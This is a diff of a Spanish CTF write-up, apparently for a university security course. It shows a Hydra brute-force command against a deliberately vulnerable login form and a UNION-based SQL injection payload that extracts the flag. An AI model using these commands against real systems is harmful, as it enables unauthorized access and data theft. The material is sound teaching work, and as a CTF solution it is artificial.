@@ -127,24 +127,25 @@ Vulnerabilidad en el `/loginCarlos` <br>
       </tr>
     </table>
 
-    Notar que como los mensajes de error son relativamente aleatorios, uno pensaría que esto inutiliza Hydra. Sin embargo, dejamos de todas formas el mismo mensaje de error en caso de que el **username** sea correcto. <br>
-    Una vez averiguado el mismo, el mensaje de error para distintas contraseñas sí es igual:
-    <span style="color: #FF4000;">"Clave incorrecta! :D"</span>
+Notar que como los mensajes de error son relativamente aleatorios, uno pensaría que esto inutiliza Hydra. Sin embargo, dejamos de todas formas el mismo mensaje de error en caso de que el **username** sea correcto. <br>
+Una vez averiguado el mismo, el mensaje de error para distintas contraseñas sí es igual:
+<span style="color: #FF4000;">"Clave incorrecta! :D"</span>
 
-    Ejemplo con Hydra:
-    ```
-    hydra -l su -P rockyou.txt -V "https-form-post://eshs2022.dsa.linti.unlp.edu.ar/loginCarlos:username=^USER^&password=^PASS^:F=Clave incorrecta"
-    ```
+Ejemplo con Hydra:
+
+```
+hydra -l su -P rockyou.txt -V "https-form-post://eshs2022.dsa.linti.unlp.edu.ar/loginCarlos:username=^USER^&password=^PASS^:F=Clave incorrecta"
+```
 
 Una vez que se explota la vulnerabilidad, se obtiene el <br> `/infoUsuario?username=su` <br>
 En este caso, se puede hacer una Inyeccion SQL para obtener datos de la Base de Datos. <br> 
 Si queremos acceder directamente a la flag, usamos el payload:
 
-   ```
-   http://localhost:42069/infoUsuario?username=asd' UNION SELECT username,username,role,role,role FROM user WHERE username!='admin' AND username!='su
-   ```
-    Se puede ver entonces que la flag se encuentra como: <br>
-    `<a href="mailto:flag{FLAG_NAME}">flag{FLAG_NAME}</a>`
+```
+http://localhost:42069/infoUsuario?username=asd' UNION SELECT username,username,role,role,role FROM user WHERE username!='admin' AND username!='su
+```
+Se puede ver entonces que la flag se encuentra como: <br>
+`<a href="mailto:flag{FLAG_NAME}">flag{FLAG_NAME}</a>`
 
 
 ## Hint para el CTF
